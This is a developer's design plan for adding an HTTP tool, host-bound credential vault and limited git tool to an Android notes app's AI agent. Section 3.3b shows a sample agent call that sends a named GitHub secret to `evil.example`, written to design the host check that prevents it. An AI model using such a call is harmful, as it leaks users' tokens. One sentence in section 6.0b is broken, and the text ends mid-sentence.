# PLAN — a universal agent: HTTP, git, and the layers that stay

**Written 2026-11-06. Replaces an earlier draft that grew by accretion as each question was researched and
was never readable end to end. This is the one document.**

**The operator's target:** *"a system that is universally flexible and does not rely on specifically github
and openrouter but on any git and llm provider that supports openai and git protocols which will unlock 90%
of potential userbase… I don't want to overbuild it."*

**The short version of what this document concludes:** that target is three quarters reachable, the missing
quarter is CI, and the work is five parts of very different sizes — one of which is a **bug fix that is
already live**.

---

## 1. The target, measured rather than assumed

The app has four layers. Three of them are already protocol-shaped; one is a product.

| Layer | Protocol | Portable today? | What actually blocks it |
|---|---|---|---|
| **Git sync** | git smart-HTTP | **Yes** — JGit, and the remote URL is already a plain string (`GitService.setRemoteUrl`) | `Secrets.isGitHubHost` gates the credentials — §4 |
| **Any API** | HTTP | **Yes** — `Fetcher` already does GET with per-hop SSRF checking | nothing but the missing verb — §3 |
| **Model** | OpenAI chat-completions | **Mostly** — `Door.kt` is OpenAI-shaped | one hardcoded endpoint and three OpenRouter-only fields — §5 |
| **CI / artifacts** | **none — each provider is a different product** | **No** | not a config problem — §7.4 |

**So "universal" is three quarters true.** GitHub Actions, GitLab Pipelines and Gitea Actions have different
file formats, different trigger models and different artifact APIs. `http` makes every provider
*reachable*; it cannot make them *interchangeable*. Saying so plainly is part of the plan, because the
operator's framing assumes this quarter is portable and it is not.

---

## 2. What already exists — measured, with line numbers

Nothing below is a guess; each was read.

| Thing | Where | What it means here |
|---|---|---|
| `Fetcher.bytes(url, limit)` | `Fetcher.kt:29` | **GET only.** Follows redirects by hand so `Addresses.problem` runs on **every hop**; counts bytes **while reading** and stops at the cap. This is the whole transport. |
| `Fetched.LIMIT_BYTES` | `Fetcher.kt:196` | 100 MB — **a memory cap, not a context cap** (§6). |
| `Fetched.nameFor(url)` | `Fetcher.kt:206` | The URL→filename rule, written and tested. |
| `Addresses.problem(url, privateAllowed)` | `browser/Browser.kt:175` | The SSRF guard, applied at three sites today. |
| `Credentials.secret(name)` | `CredentialStore.kt` | The vault: per-account, keystore-encrypted, unreadable while locked. |
| `McpServer.authorization(credentials)` | `Mcp.kt:54` | The precedent: an article **names** a secret, the store resolves it, the value never reaches the model. |
| `AgentTools.forConversation` | `AgentTools.kt:4361` | A result over the token budget is **filed whole** and answered with a path. Already the rule for every tool. |
| `AgentTools.KEYS` | `AgentTools.kt:404` | **24 tools**, one argument table, `unknownIn` refuses undeclared keys. |
| `AgentTools.specs()` | `AgentTools.kt:537` | The descriptions the model reads. |
| `when (call.tool)` | `AgentTools.kt:1029` | The dispatch table. |
| `Door.body(request)` | `Door.kt:522` | The assembled request body — **and the thing its own comment says is worth pinning.** |
| `Door.ENDPOINT` | `Door.kt:845` | `https://openrouter.ai/api/v1/chat/completions` — hardcoded. |
| `GitHub.API` | `GitHub.kt:1179` | `https://api.github.com` — hardcoded. |
| `Secrets.isGitHubHost` | `Secrets.kt:117` | Called at `GitService.kt:366` and `GitHub.kt:683, 763, 1047, 1129`. |
| `AppViewModel.refresh()` | `AppViewModel.kt:852` | Re-reads the tree from disk. **29 call sites, all UI actions.** |

**The transport, the guard, the vault, the filing rule, the naming rule and the git client all exist.**
Every part of this plan is a composition of them, which is the argument that it is not overbuild.

---

## 3. Part A — the `http` tool (the core of the plan)

### 3.1 `Fetcher.request` — one method beside `bytes`

```kotlin
fun request(
    url: String,
    method: String,                 // GET POST PUT PATCH DELETE HEAD
    headers: Map<String, String>,   // already resolved — never holds a vault value
    body: ByteArray?,               // null = no body
    limitBytes: Long,
): Result<Answer>

data class Answer(val status: Int, val headers: Map<String, String>, val bytes: ByteArray)
```

**What it must keep from `bytes`** — each is a decision that was already paid for:

1. **The address check on every hop.** `bytes` follows redirects by hand precisely so the guard re-runs on
   each `Location`. A `request` using `HttpURLConnection`'s automatic following would check the URL the
   agent typed and then walk to `127.0.0.1`.
2. **Counting while reading.** `Content-Length` is a claim; a server that omits it and keeps writing is the
   case a cap exists for.
3. **The status, kept separate from the body.** `bytes` throws the status away. An API's entire vocabulary
   is statuses, and a 404's body is the diagnostic while the number is the fact.
4. **`Accept: */*` and a `User-Agent`** — GitHub's API rejects a request without one.

**What is new:** the method, the headers, the body, the status.

**What it must not do:** **follow a redirect for a non-GET.** A `POST` redirected to a `GET` silently loses
its body, and GitHub's API does exactly this on a repository rename. A 3xx on a non-GET is returned as a
status.

### 3.2 The tool

```kotlin
"http" to setOf("method", "url", "headers", "body", "auth")
```

| Key | Meaning |
|---|---|
| `method` | `GET` when absent. Anything outside the six is refused **by name**. |
| `url` | Through `Addresses.problem` **before anything is opened**. |
| `headers` | A JSON object. **`authorization`, `cookie`, `proxy-authorization` and `x-api-key` are refused here** — §3.3. |
| `body` | A string, **or `@path`** to send a file's bytes. Default `content-type: application/json`. |
| `auth` | **A name in the vault.** The app resolves it to `Authorization`. Never a value. |

**The answer** follows the shape the app already uses everywhere — a status, a size, a path:

```
0
POST https://api.github.com/repos/o/r/git/refs → 201 (412 bytes)
written to agent/http/refs-a1b2c3.json

{"ref":"refs/heads/x","object":{"sha":"…"}}
```

**Where the bytes go, and why it is not a choice:**

- **Small text** is answered inline **and** filed — an agent reading 200 bytes of JSON to decide its next
  call should not need a second call to read it.
- **Everything else is filed only**, and the answer names the path. Same rule as `fetch`, `runs`, `artifact`.
- **The folder is `agent/http/`**; the name is `Fetched.nameFor(url)` **plus a short hash of method and
  body**, so two POSTs to one URL cannot overwrite each other. **The agent does not name the file.**

### 3.3 The vault handle — three rules, and rule 3 is the one that must be tested

1. **`auth: "name"` resolves through `Credentials.secret(name)`.** A missing secret is a refusal that names
   what would create it — not a bare `401`, which sends the agent to debug the server.
2. **An agent-written header may not be `authorization`/`cookie`/`proxy-authorization`/`x-api-key`.** If it
   could, the vault would be decorative: the agent would simply type the token. Refused **before the
   request is made**, naming the header and the reason.
3. **The resolved value is never echoed** — not in the answer, not in a trace, not in the request log, not
   in a `background` result.

**Rule 3 is the one that gets a test before the tool is reachable by a model**, because a token in a log
cannot be recalled.

### 3.3b The vault must bind a secret to a host — **and it has no door at all**

This was missing from the first draft and the operator found it. Two separate defects, and the first is a
security hole in §3.3 as written.

#### The hole: `auth:` as specified is a token-exfiltration primitive

§3.3's rule 2 says the agent may not write an `authorization` header — so it cannot type the token. **But it
can still name it:**

```
http { "url": "https://evil.example/x", "auth": "github" }
```

The agent names the secret, the app resolves it through `Credentials.secret(name)`, and the value goes to a
host the agent chose. **Rule 2 stops the agent typing the token; it does not stop the app sending it.**

Today this is contained only because nothing can make such a request. `http` is exactly the thing that
removes that containment.

**The fix is the same one Part B just made in `GitService`:** the lookup takes the destination, so there is
no way to ask for a secret without saying where it is going.

```kotlin
// Before — the signature cannot express the rule.
fun secret(name: String): String?

// After — the host is part of the question, not part of the name.
fun secret(name: String, host: String): String?
fun setSecret(name: String, value: String, host: String)
```

`secret("github", "evil.example")` returns null. **The check lives in the store, so no tool can forget it** —
which is the same reasoning that moved `isGitHubHost` out of five call sites and into `credentials(remoteUrl,
token)`.

**Why the host is a field and not part of the key.** Making the URL the key — `secret("https://api.github.com")`
— was the operator's suggestion and it is the wrong shape: changing a base URL would break the secret, one key
could not serve several hosts, and the name a person reads in a list would be a URL. A field says *"this value
may go to this host"* once, and the name stays a name.

#### The bigger defect: **nothing in the app can create a secret**

```
$ grep -rn "setSecret(" app/src/main/java/com/example/notes/
(no results)
```

`setSecret` is called **only by tests.** The vault is encrypted, tested, and reachable — and **no person can
put anything into it.** `mcp` reads names that an article mentions, and there is no way to make one exist.

That is the same defect class the morning audit found in `createdByOperator` and `CiSetup`: **a tested
function nothing calls.** It makes `http`'s `auth:` untestable in practice, because there is no way for a
person to supply the first secret.

**So Part A needs a door:**

1. **A settings screen listing secrets by name** — never values. Add, rename, delete. The value is typed once
   and never shown again, which is what the store already enforces and what a person expects of a key.
2. **The host is asked for when the secret is created**, because it is part of what the secret *is*.
3. **A `secrets` tool that lists names only.** An agent that can see a name it needs is fine; one that can
   enumerate every service a person uses is not, and one that can read values is the leak this whole section
   exists to prevent.

#### Tests — each with what fails if it is removed

| # | Test | Fails if removed |
|---|---|---|
| 13 | `secret("github", "evil.example")` returns null | the agent exfiltrates the token by naming it |
| 14 | `secret("github", "api.github.com")` returns the value | the host check is too strict and nothing works |
| 15 | A subdomain is **not** matched by a bare domain (`api.github.com` vs `github.com`) | a look-alike host collects the key |
| 16 | `http` with `auth:` for the wrong host refuses, naming the host | the refusal is silent and the model retries |
| 17 | The `secrets` tool answers names and never a value | the tool is a value reader |
| 18 | A secret set through the screen is readable by `http` | the door and the store disagree |

Test 15 is the one that is easy to get wrong: `evil-github.com`.endsWith(`github.com`) is **false**, but
`api.github.com`.endsWith(`github.com`) is **true** — so the rule must compare **whole labels**, not
suffixes. `Secrets.hostOf` already answers the normalised host; the match is `host == allowed ||
host.endsWith("." + allowed)`.

#### Cost

- `CredentialStore.secret(name, host)` / `setSecret(name, value, host)` — the signature change plus the
  match, ~20 lines, and it touches `Mcp.kt:57` and every test fake.
- The settings screen — the first real UI for secrets, so the largest piece.
- The `secrets` tool — ~40 lines plus refusals.

**This is inside Part A, before `http` is reachable**, not after: a tool whose auth cannot be created safely
or used safely should not ship.

### 3.4 Tests — each with what fails if it is removed

| # | Test | Fails if removed |
|---|---|---|
| 1 | A GET returns the status and files the body | every API answer reads as success |
| 2 | A POST sends its body and its `content-type` | the body arrives empty |
| 3 | `auth` puts `Authorization` on the request | the vault is decorative |
| 4 | **A vault value never appears in the answer, the trace or the log** | a token leaks, permanently |
| 5 | `authorization` in `headers` is refused, naming the header | the agent bypasses the vault |
| 6 | A non-GET redirect is reported, not followed | a POST becomes a GET and loses its body |
| 7 | A redirect to a private address is refused **on the hop** | the SSRF guard only checks the typed URL |
| 8 | A body over `LIMIT_BYTES` stops at the cap while reading | the phone OOMs on a hostile response |
| 9 | A `file://` or `ftp://` URL is refused | the scheme guard is bypassed |
| 10 | Two POSTs to one URL do not overwrite each other's file | the second answer points at the first's bytes |
| 11 | A missing secret names what would create it | the agent reads "401" and blames the server |
| 12 | `body: "@path"` sends the file's bytes | a file cannot be posted |

Test 4 belongs in `KeySafetyFeatureTest`, which already asserts the token never reaches a message.

**Cost:** `Fetcher.request` ≈ 60 lines; the tool ≈ 120 including refusals; 12 tests.

---

## 4. Part B — `isGitHubHost`: **investigated, and the proposed fix was wrong**

```kotlin
// GitService.kt:366 — the clone
if (Secrets.isGitHubHost(remoteUrl)) {
    credentials(token)?.let { command.setCredentialsProvider(it) }
}
```

**What this looked like:** a clone of a private repository on any non-GitHub host silently fails to
authenticate. The token never reaches the request, so it fails as though the credentials were wrong — which
is the one failure mode the app's rules forbid. The same guard is at `GitHub.kt:683, 763, 1047, 1129`.

**What this plan proposed:** make `isGitHubHost` mean *"is this a host we hold a token for"* — a lookup in the
credential store rather than a string comparison against `github.com`.

**That proposal was wrong, and the investigation is why it is recorded here rather than implemented.**

### 4.1 The measurement

```
CredentialStore.tokenKey(login) = "token_$login"      // ONE token, per login
CredentialStore.token(login)                          // no host argument at all
```

and the login itself comes from GitHub:

```kotlin
// AppViewModel.kt:4882
val who = signInGitHub().identity(answer.token).value
```

So **there is exactly one token, and it is a GitHub token.** The store has no notion of a host. Rewriting the
guard as "is this a host we hold a token for" would make the answer *yes* for every host — and then send a
**GitHub OAuth token to `gitlab.com`**, because that is what `credentials(token)` would attach.

**The guard is not a wall. It is the thing that keeps the token on the one host it belongs to.** Deleting it
would be a token leak dressed as a portability fix — and it would be silent, which is the property the app
forbids everywhere else.

### 4.2 What the real defect is

The clone's failure is not the guard. It is that **the guard's refusal has no voice**: the clone goes out
unauthenticated and the server answers 401, so a person is told "authentication failed" about a token the app
deliberately withheld.

**So the fix is not to widen the guard, it is to make it speak:**

```kotlin
if (!Secrets.isGitHubHost(remoteUrl) && !token.isNullOrBlank()) {
    return RemoteResult(
        "This repository is at ${hostOf(remoteUrl)}, and the key on this phone is a GitHub key. " +
            "It was not sent, because a key given to the wrong host is a leaked key. " +
            "Cloning a private repository elsewhere needs a key for that host.",
        false,
    )
}
```

That is ~10 lines, it changes no behaviour, and it turns a silent 401 into a sentence that names the
situation. **A refusal with a voice is the whole of the fix.**

### 4.3 What real non-GitHub support would need

If cloning from another host is genuinely wanted, the guard is not the obstacle — **the credential model is.**
It would need:

1. `CredentialStore.secret(name, host)` — a secret bound to the host it was stored for, which is the same rule
   §3.3 imposes on `http`'s `auth:` and which the vault does not have today (a secret is bound to a *name*,
   never to a *host*).
2. A place in the add-project dialog to say which host and which key, because "the key on this phone" stops
   being a single answer.
3. The `http` `auth:` mechanism from §3, so one rule covers both.

**That is a feature, not a fix, and it belongs after §3 lands** — because §3 is where the host-bound secret is
first needed, and building it twice would be building it wrong once.

### 4.4 So Part B, as it stands

| | Was | Now |
|---|---|---|
| The bug | a private clone elsewhere fails silently | **still true** |
| The cause | the guard | **the guard is correct; the silence is the bug** |
| The fix | widen the guard | **make it refuse in words** |
| The credential model | "is this a host we hold a token for" | **one GitHub token, host-bound secrets are a separate feature (§4.3)** |

**Cost:** ~10 lines and one test — a clone to a non-GitHub host with a token present returns a sentence
naming the host and the reason, and sends nothing.


---

## 5. Part C — **WITHDRAWN: the provider config**

This section proposed replacing `Door.ENDPOINT` and the three OpenRouter-only body fields with a config
file, so any OpenAI-compatible endpoint could be used by editing one file.

**The operator withdrew it on 2026-11-06:** *"I don't think that we need to generalize it into openai config
— as it is now is good enough. It is more important to make git, http and secrets work properly."*

**That is the right call, and the reasoning is worth keeping.**

### 5.1 Why it was a bad trade

The config's whole benefit was **reaching a second provider**, and the cost was real:

- **A compile-time guarantee moved to runtime.** `Door.body` is pinned by a Kotlin test — its own comment
  says *"the assembled body is the thing worth pinning rather than the call that wraps it."* A config file
  cannot be pinned by the compiler, so every typo becomes a refusal that has to be built and tested, and a
  broken config becomes a mystery 400 during a turn.
- **It does not even reach the providers people would name.** Anthropic's Messages API and Google's
  `generateContent` are structurally different — different message shapes, different tool-call format,
  different streaming events. The config covers only the providers that already copied OpenAI's shape.
- **The schema is the most load-bearing code in the app.** `Door.kt` is 894 lines of assembled body, stream
  parsing, stall detection and failure classification. It is not the place to add a second input language.

### 5.2 What was actually needed instead

Nothing. The three things the operator named — **git, http and secrets** — are the parts that are
incomplete, and the provider config would have competed with them for the same attention while delivering a
capability nobody had asked to use.

### 5.3 The finding that survives

**`provider.only` and `allow_fallbacks` are OpenRouter-specific, and that is fine.** A model layer that
speaks one provider's schema well is not a limitation to be engineered away; it is a decision, and the plan
records it as one so it is not re-proposed.

**If a second provider is ever genuinely needed**, the honest shape is a second `Door` implementation
(`AnthropicDoor`) with its own body and its own stream reader — a real thing, written and tested as a real
thing — not a template language that pretends two different protocols are one.

---

## 6. Part D — the `git` tool, and the folder rule that decides what git sees

### 6.0 The folder rule: `assets/` and `ignored/`

The operator's design (2026-11-06), which supersedes the extension-list approach the app has today:

> *"leave 2 folders at the project root … those are assets and ignored folders. and only files from
> assets go to lfs. and in other folders only text files are tracked. And no rule difference between
> operator and agent, only that agent cant put anything inside lfs folder — it is under operator's
> control."*

**Two folders, one meaning each:**

| Folder | Tracked | Stored | Who writes it |
|---|---|---|---|
| `assets/` | **yes, through LFS** | LFS objects | **the person only** |
| `ignored/` | **never** | this phone only | the person |
| everything else | **yes, whatever the kind** | ordinary git blobs | person **and** agent |

**"All files can be tracked, but a non-text file is born untracked"** — the operator's correction, and it
is the rule. Anything can be tracked; what differs is the **default** at the moment of creation.

**This replaces the extension list, and that is the point.** Today `LFS_ATTRIBUTE` is built from
`IMAGE_EXTENSIONS = {png, jpg, jpeg, gif, webp, bmp}` — so a `.zip`, `.mp4` or `.apk` in a project is
committed **as a raw blob**, which is a live bug given that `fetch` + `unpack` is the documented way to
vendor a dependency. A folder rule is one line instead of a list that has to grow:

```
assets/** filter=lfs diff=lfs merge=lfs -text
```

`Workspace.IMAGE_EXTENSIONS` stays where it is still needed — `kindOf` deciding whether a file is text —
but it stops deciding what is *stored*, which was never the right question for it.

**Why the agent may not write to `assets/`.** It is the one folder whose contents cost the operator
money to store (LFS bandwidth and quota are billed) and whose size is unbounded. An agent that can
write there can spend the operator's quota without asking. It is the same shape as the existing `locked`
concept, so the refusal is the one that already exists rather than a new mechanism.

### 6.0b The born-untracked rule is `kindOf != TEXT`, and it is **wider** than today

`Workspace.shouldIgnoreOnCreate(file)` is one line today:

```kotlin
fun shouldIgnoreOnCreate(file: File): Boolean = kindOf(file) == EntryKind.UNKNOWN
```

`EntryKind` is `{FOLDER, TEXT, IMAGE, UNKNOWN}`, so the current defaults are:

| kind | born | note |
|---|---|---|
| TEXT | tracked | |
| **IMAGE** | **tracked** | which is *why* `LFS_ATTRIBUTE` exists |
| UNKNOWN | ignored | |

**The operator's rule is wider than the current behaviour**, not narrower: it flips **images** from
tracked to born-untracked, and `assets/` becomes the one place a picture is tracked — through LFS.

```kotlin
fun shouldIgnoreOnCreate(file: File): Boolean = kindOf(file) != EntryKind.TEXT
```

**CORRECTED, 2026-11-06, by CI.** The paragraph below was wrong about where the cost lands. Four
`EditorScreenTest` cases went red: `createFile` is the person's own door and it calls
`shouldIgnoreOnCreate`, so once `IMAGE != TEXT` a `.png` made through New File stopped being committed
and **every drawing lost its version**. That is not a stray screenshot in `src/` — it is the app's main
picture flow, and the cost was underestimated here rather than merely accepted.

**The rule that shipped keeps the distinction that was meant:** a picture **arrives** untracked (a
screenshot in `src/`, an archive unpacked beside the code — those should not silently become repository
blobs) and is **tracked when the person makes it**, because pressing New File and choosing a picture name
is a decision rather than a default. `assets/` still decides where a picture is *stored*, through LFS; it
is not a licence to take the version away.

**The cost as it now stands.** A person who drops a `.png` anywhere outside `assets/` That is the exact worry recorded in `createdByOperator`'s own comment — *"an
ignored file is not committed, so the person's own note had no version and no undo — and 'every change is
a version' is the promise this app exists for"* — and the old rule answered it by keeping pictures
tracked (*"same as with pictures"*).

**The trade is accepted, for a reason the old comment could not have:** `assets/` now exists as the
deliberate home for a picture, and a picture has no meaningful line history anyway. What the person loses
is undo; what they gain is that a stray screenshot in `src/` no longer silently becomes a repository
blob. **The screen must say so** — the same sentence the broken-link icon already implies — because a
file with no version is the one thing here a person cannot discover by looking.

### 6.1 `.gitignore` is **kept**, and this is why

The operator asked whether removing it was a bad idea. **It is, and the reason is not that it is already
built.**

`assets/` + `ignored/` is a **fixed, structural** rule: two folders, one meaning each. `.gitignore` is a
**per-path** rule. They do different jobs, and the case that breaks the folder-only design is ordinary:

> A person has `vendor/dependency/` — 40 MB, one folder among two hundred they *do* want. Or a
> `notes/drafts/` folder. Or a 300 MB `.mp4` in the project root, which `assets/` cannot hold (it is not
> theirs to spend quota on) and `ignored/` cannot hold (they did not put it there).

The folder-only answer is *"move it into `ignored/`"*. But **moving a file is a different act from
declaring it not sent**, and it changes the shape of the person's project to suit the sync engine — which
is the thing the ignore rule was built to avoid.

**The stronger reason: `.gitignore` is content.** It is a tracked file, it goes to GitHub, and it is a
document a person may read and edit. The folder rule is **not in the repository at all**. A project
cloned onto a desktop, or opened by any other git tool, would carry no record of which paths are
deliberately excluded. That loss only shows up when somebody uses the project outside this app.

So the three are complementary, and the plan says so:

| | `assets/` | `ignored/` | `.gitignore` |
|---|---|---|---|
| Decides | where binaries live | where scratch lives | one path, either way |
| In the repository | yes (as LFS pointers) | no | **yes, as a file** |
| The person's act | put it here | put it here | mark *this* one |

**The default and the escape.** A person who puts a binary in `assets/` and scratch in `ignored/` never
touches `.gitignore`. One who has a file that belongs in neither uses it, and the broken-link icon stays
because it is the only way to say *"this one, here, not sent"*.

### 6.2 `state` is removed

**Its two halves are two different questions wearing one name**, and the operator is right that the agent
should own push and pull:

| `state` line | what it actually compares |
|---|---|
| `unsent paths` | **HEAD vs `origin/<branch>`** — commits not pushed |
| `ahead/behind` | the same pair, as counts |
| `uncommitted` | **working tree vs HEAD** — a different question |
| `ignored` | `ignoredNotInIndex` |

The tool, the `state` row in the UI, and `KEYS["state"]` all go. `pull` and `push` stay — they are the
agent's, and they need no status call to be correct.

**What must not be lost with it.** The `ignored` line is the only place the app says *"there is a 40 MB
video on this phone that will never be on GitHub"*. Without it, a project holding one video and one note
reports **"Nothing to send"** — true of the note, a lie about the project. That sentence moves to the
**project row** (`BrowserScreen.kt:679`, which already shows the unsent count), because it is a fact for
the person, not a question for the model.

### 6.3 `diff` — revisions only, because every tracked change is committed

The operator: *"working tree vs HEAD doesnt make sense because we autocommit on every change to tracked
files/folders."* **Correct**, and I verified it: every agent write ends in `commit(...)`, and the person's
edits go through `afterChange` → `commitProjectOf`. A tracked change that is not committed does not exist.

```kotlin
"git" to setOf("op", "path", "from", "to")
```

| `from` | `to` | answers |
|---|---|---|
| absent | absent | **HEAD's last commit** — what the most recent change did |
| present | absent | that revision **vs HEAD** |
| present | present | **A..B** — the case the operator named |

`path` is a **prefix**, so `src/` answers *"what changed in this folder between these two"* — the
`git log -- path/to/folder` question, and the one that matters after `unpack` lands forty files.

**Why this is the strong candidate the operator says it is:** `read` shows **full contents, not changes**.
For a 400-line file where three lines moved, reading costs 400 lines of context and leaves the model to
diff in its head, which it does badly. A diff is the compressed form of exactly the question being asked.

**Always filed, never quoted** — `agent/git/diff-<from>-<to>.txt`, with the conversation getting the
count, the added/removed line totals, and the first N paths. Same protocol as `runs` and `shot`.

**Binary paths are listed and not diffed** — `data.zip: binary, changed` — because `diffLines` on a zip is
a page of replacement characters. `Workspace.kindOfPath` answers this by name, before anything is read.

**Nothing else is in the tool.** No `show` (every commit is one file and its message is generated from the
filename — it would print the same string twice). No `blame` (in a single-person project the answer is
almost always "you"). No `stash` (nothing to park: tracked changes are committed). No `checkout` (moving
HEAD silently changes which history the agent reads and which commits `push` sends; the agent has one
project, one branch, one remote). No `revert` (`restore {path, revision}` already puts a file back and
commits; if multi-file undo is wanted, the fix is `restore` taking a list, not a second op).

### 6.4 LFS is **per repository**, on both sides — and it costs

Measured, not assumed:

- **Local:** `LfsStore.dirOf(repo) = File(repo.directory, "lfs/objects")` — inside `.git/`, so one store
  per project.
- **Remote:** `LfsClient.endpointOf(remoteUrl)` → `https://github.com/<owner>/<repo>.git/info/lfs` — one
  endpoint per repository on the server.

**So the same picture in two projects is uploaded twice and stored twice.** There is no account-level
blob store and no cross-repository dedupe. For a 40 MB asset shared between two projects that is 80 MB,
and it is billed twice.

**Not worth fixing.** A shared local store would save phone disk and nothing else — GitHub bills LFS per
repository, so the cost the person actually pays does not change. Recorded here so it is a known cost
rather than a surprise.

### 6.5 A pull leaves an ignored file alone — and there is now no second path

**One sentence, because there is one path.** `pull` is `GitService.merge`, and a merge touches only the
paths in the trees being merged. An ignored path is in no tree, so nothing in a pull can reach it: an
ignored file stays until the project folder stays.

**The earlier draft of this section had a second case and a risk in it.** `replaceWithRemote` did a hard
reset and then deleted `status.untracked + untrackedFolders + missing` wholesale. `status.untracked`
excludes ignored paths, so a plain ignored file survived — but `untrackedFolders` is coarse and
`deleteRecursively` on a folder name is a bigger hammer than the question asks for, and whether it could
eat an ignored file beside untracked content was **unverified**.

**The operator removed the question instead of answering it:** *"we dont need replace with remote — If I
need that I will just delete the project locally and import it again."*

That is better than a fix, for a reason worth keeping: **the delete path already exists**, is already
destructive-with-confirmation, and already has the shape a person expects. A second way to destroy a
project is a second set of rules about what survives, and this one had a hazard in it that nobody had
measured.

### 6.5b `replaceWithRemote` is removed

**One caller reaches it:** the add-project picker, when a repository with that name is already here
(`MainActivity.kt:759` — *"Already here: replacing the copy is a question"*), plus `pullRepository`
calling it directly (`AppViewModel.kt:3954`).

**What goes with it:**

| Removed | Where |
|---|---|
| `Pending.ReplaceProject`, the confirm dialog, `askReplace` | `MainActivity.kt:140, 593, 950` |
| The picker's branch that offers it | `MainActivity.kt:759` |
| `ProjectGit.replaceWithRemote` | `ProjectGit.kt:467` |
| `GitService.resetToRemote` | `GitService.kt:1149` |
| The Maintenance marker that names it | `Maintenance.kt:22` |
| The index-invalidation comment that cites it | `SearchIndex.kt:397` |
| The test built on the reset path | `IndexQueueTest.kt:130` |
| A doc comment citing it as the other half of `fetch` | `GitService.kt:535` |

**The picker's branch is replaced, not deleted.** Today *"that repo is already here"* offers **replace**.
With replace gone the honest answer is **"this project is already here"** — and a person who wants a fresh
copy deletes it and imports again, which is one act they already know.

**`GitService.resetToRemote` goes too**, because nothing else calls it. `fetch` stays — `pull` uses it.

### 6.6 What is built, and in what order

| # | What | Why here |
|---|---|---|
| 1 | `assets/` + `ignored/` as structural folders; `assets/**` in `.gitattributes`; agent refused in `assets/` | The rule everything else reads. |
| 2 | `shouldIgnoreOnCreate` becomes `kindOf != TEXT` (§6.0b) | One line, and it is what makes the folder rule mean anything. |
| 3 | Remove `replaceWithRemote` and everything it carries (§6.5b) | **Before `diff`**, because it deletes a reset path and a test, and doing it later means touching the same files twice. |
| 4 | `git {op: "diff", path, from, to}` | The one genuinely missing capability. |
| 5 | Remove `state` — tool, `KEYS`, UI row; move its `ignored` sentence to the project row | The operator's call, and it is right. |

**Cost:** ~200 lines plus tests, and **less than the previous draft** — removing `replaceWithRemote` takes
out a dialog, a `Pending` case, a picker branch, two service methods and a test, which is most of what the
`untrackedFolders` test was going to cost. The `diff` op reuses `GitService.diffLines` and `ProjectGit.log`;
the folder rule is mostly `Workspace` and `GitService` constants plus one refusal.

**No test is owed for a wipe that no longer exists.** That is the whole gain of §6.5b.

### 6.7 What this does not do

- **No branch operations.** No create, switch or list. A branch is a decision about what the project *is*,
  not a step in a task, and the agent has one branch.
- **No history rewriting.** `filter-branch` and `rebase -i` stay refused; `HistoryPrune` was deleted on
  purpose.
- **No `gc`.** Maintenance is the app's own schedule, not something a model triggers.
- **No argv passthrough.** `{git: "arguments"}` is a shell by another name: quoting, `-c` flags, and
  `--upload-pack=…` reaching an arbitrary binary. Refused in §6.1 of the earlier draft and still refused.
- **No `pgm` embed.** Measured: `org.eclipse.jgit.pgm` drags Jetty (for `lfs serve`), a second Apache
  HttpClient, SSH transports and a GPG stack — for a terminal CLI this app has no terminal for.

---

## 7. Part E — the refresh hook: a bug that is live now

### 7.1 The measurement

- The project **is** a real directory: `Workspace.projectDir = File(accountDir, project)`.
- `ProjectTree` calls `dir.listFiles()` on every read and **caches nothing**.
- `AppViewModel.entries` is `mutableStateOf`, replaced wholesale by `refresh()`, which re-reads from disk.
- **`refresh()` has 29 call sites. Every one is a UI action.** Not one is an agent event.
- `tickAgents()` (the 15-second clock) does not touch the tree.
- `AgentTools` has no callback to say "I changed something on disk".

### 7.2 So today

The agent writes ten files — **the file list does not move.** The agent pushes and pulls — **the list does
not move.** The person leaves the project screen and returns, and *then* it is right.

That is the same defect already documented at `AppViewModel.kt:165` — *"adding and deleting a project shows
the change only after you exit and enter the project menu again"* — fixed for **UI actions** and never
extended to **agent actions**.

**And Part D makes it urgent:** an `unpack` writes forty files in one call and commits none of them, and a
list refreshed only by taps would be stale for the entire time the agent works.

### 7.3 The fix

One injected callback, the same shape as `bg`, `phone` and `browser` — all injected so a test needs no
`Context`:

```kotlin
private val onDiskChanged: (String) -> Unit = { }
```

called by every tool that can touch the tree — `write`, `delete`, `move`, `restore`, `push`, `pull`,
`fetch`, `artifact`, `download` — and wired once at `AgentWiring` to `main.post { refresh() }`.

**Why a callback and not a `FileObserver`:** `FileObserver` is unreliable across the Android storage
boundary, costs a thread per directory, and fires dozens of times during a checkout. **The app already
knows when it changed a file — it is the one doing it.** A callback is exact where a watcher is a guess.

**Test:** an agent call that writes a file, then a read of `entries`, must show the new row without anyone
leaving the screen. Fails today.

**Cost:** ~30 lines plus the test. **The smallest part, and the most visible.**

---

## 8. What is deleted

| Deleted | Why |
|---|---|
| **`fetch`** | It is `http` with `method: GET` and a fixed folder. Keeping both is two descriptions in the cache prefix and two ways to say one thing — the defect the operator already fixed twice (`create`/`edit` → `write`; the `-u` flag → `archive`). |
| **`fetchAllowed`** | Renamed `httpAllowed`. `http` must honour the same switch, and the settings label follows. |
| **`Fetched.DIR`** | `http` gets its own folder. `Fetcher`, `Fetched.nameFor` and `LIMIT_BYTES` are all **kept**. |
| **`gh`** | **Never built.** A typed method per endpoint is what made `CiSetup` take five compile rounds and what leaves four `REPOSITORY:` bindings to keep in step. `http` covers it, and a new GitHub endpoint needs no app change. |

---

## 8b. The audit: every tool, its tests, and the gaps that remain

**Run at `57fe7f1`, after Parts 4 and D landed.** 21 tools. The count below is mentions in the test
sources, which is a proxy — the real question is asked per tool afterwards.

| Tool | Tests | Verdict |
|---|---|---|
| `search` | 110 | **The strongest tool in the set.** Text mode, semantic mode, history in both, scope/depth/paths, `word`, `count`, the per-file cap, the per-project refusal, and the "no model" refusal all have a test that fails if the behaviour breaks. |
| `read` | 118 | Strong. `grep` in both shapes, `numbers`, `word`, ranges, revisions, `multi`, binary refusal. |
| `write` | 40 | Strong: three shapes, the stale-read check, locked paths, `multi`. |
| `http` | 30 | Every behaviour reasoned; **the network is faked everywhere except `LiveHttpTest`**, which is skipped unless `MUFFY_LIVE_HTTP=1`. That is the largest remaining risk and it is now measurable rather than unknown. |
| `query`, `browse`, `look`, `ci`, `artifact`, `download`, `downloads`, `upload`, `archive`, `mcp` | 6–35 | Covered, including their refusals. |
| **`pull`, `push`** | **2, 4** | **The thinnest.** Both refusals are tested (no remote; uncommitted change) and both are the cases an agent meets offline. **Neither has ever run against a real remote** — the offline suite cannot, and that is unchanged. |
| **`shot`** | 6 | The engine is tested through `browse`; a real capture needs a device. |
| **`git`** | 4 | New, and every path is tested: counts, folder prefix, binary by name, one-revision refusal, unknown op, unknown revision, and the schema/KEYS agreement. |

### The semantic-search audit, which was asked for specifically

**No silent incompleteness.** `caughtNotes` is added to the answer *before* the empty case is
